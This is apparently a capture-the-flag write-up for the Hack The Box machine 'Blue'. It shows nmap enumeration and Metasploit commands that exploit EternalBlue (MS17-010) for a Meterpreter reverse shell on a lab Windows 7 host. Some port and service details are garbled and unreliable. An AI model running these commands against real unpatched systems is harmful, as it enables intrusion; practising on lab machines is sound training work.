![logo](/logo.png)

# [Blue- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 28 Jul 2017 as the tenth machine on HTB,Blue created by [ch4p](https://app.hackthebox.com/users/1) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Smb
  *EternalBlue
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/blue 10.10.10.40
```

###### Output 

![](/Windows/Windows-Easy/Blue/Screenshots/nmap.png)


looking at the results  we find out that there are 4 ports open and its a `Windows`and its running an `Windows 7 Professional`. 

port[135]-netbios
port[139]-smb
port[445]-  http
port[49152]
port[49153]
port[49154]-msrpc
port[49155]
port[49156]

#### SMB Host Detection
We search for the vertion of the smb from `msfconsole`

```sh
search smb_version
use 0
set RHOSTS 10.10.10.40
set RPORT 445
run
```

![](/Windows/Windows-Easy/Blue/Screenshots/msfconsole.png)

Now that is a window 7 profesional and smb 2.1 it had vulnerability called `EternalBlue`

![](/Windows/Windows-Easy/Blue/Screenshots/eternalblue.png)


# Exploitation 

```sh
use windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set RPORT 445
set LHOST 10.10.14.**
set LPORT 4444
run
```

![](/Windows/Windows-Easy/Blue/Screenshots/msfblue.png)

and just like that we get a `Meterpreter` 

![](/Windows/Windows-Easy/Blue/Screenshots/meterpreter.png)

it grants as a root privillage lets get the flags

![](/Windows/Windows-Easy/Blue/Screenshots/shellflags.png)

	-------------------------END successful attack @lesley----------------------






